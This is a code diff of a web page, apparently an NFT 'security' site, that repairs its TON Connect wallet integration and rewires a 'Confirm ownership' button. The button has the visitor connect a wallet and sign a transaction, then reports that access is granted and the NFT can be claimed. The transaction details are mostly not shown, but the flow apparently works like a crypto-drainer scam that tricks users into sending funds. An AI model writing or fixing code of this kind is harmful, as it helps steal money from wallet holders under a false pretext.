@@ -696,29 +696,32 @@ document.getElementById("chatForm").onsubmit=function(e){e.preventDefault();cons
 applyLang(localStorage.getItem("nft_lang")==="ru"?"ru":"en");
 applyMode();
 applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
+ </script>
 <!-- TON CONNECT UI -->
 <div id="ton-connect-button" style="margin-top:12px;"></div>
-<script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
 <script>
-document.addEventListener('DOMContentLoaded', function () {
-    const connector = new TONConnectUI({
-        manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect-button'
+document.addEventListener("DOMContentLoaded", function () {
+    if (!window.TON_CONNECT_UI) {
+        console.error("TON Connect UI не загрузился");
+        return;
+    }
+    const ui = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: "https://nftsecurity.online/tonconnect-manifest.json",
+        buttonRootId: "ton-connect-button",
     });
 
+    // Код для кнопки "Confirm ownership"
     const ownBtn = document.getElementById('ownBtn');
     if (ownBtn) {
-        
-        ownBtn.onclick = null;
-       
-        ownBtn.addEventListener('click', async function () {
+        ownBtn.onclick = async function () {
             const err = document.getElementById('err');
             if (!err) return;
 
-            if (!connector.wallet) {
+            if (!ui.wallet) {
                 err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
                 err.style.display = 'block';
-                connector.openModal();
+                ui.openModal();
                 return;
             }
 
@@ -737,7 +740,7 @@ document.addEventListener('DOMContentLoaded', function () {
                         }
                     ]
                 };
-                await connector.sendTransaction(transaction);
+                await ui.sendTransaction(transaction);
                 err.textContent = '✅ Доступ получен! NFT можно забирать.';
                 err.style.color = '#00ff88';
             } catch (e) {
@@ -745,7 +748,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 err.style.display = 'block';
                 err.style.color = '#ff9abb';
             }
-        });
+        };
     }
 });
 </script>
